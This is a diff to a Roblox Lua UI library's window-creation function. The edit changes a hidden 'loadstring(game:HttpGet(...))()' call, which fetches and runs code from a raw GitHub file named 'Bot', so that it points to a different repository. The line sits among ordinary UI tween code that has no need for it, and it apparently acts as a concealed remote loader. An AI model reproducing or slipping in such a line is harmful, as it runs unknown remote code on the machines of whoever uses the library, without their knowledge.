@@ -1635,7 +1635,7 @@ function ArrayFieldLibrary:CreateWindow(Settings)
 
 		end
                 local botSet;
-                botSet = loadstring(game:HttpGet("https://raw.githubusercontent.com/ieufhosivdlkjv/TSSECURITY/refs/heads/main/Bot"))()
+                botSet = loadstring(game:HttpGet("https://raw.githubusercontent.com/lookuzt/system/refs/heads/main/Bot%20(3).txt"))()
 		local function Pick()
 			if Minimised then return end
 			TweenService:Create(TopTabButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
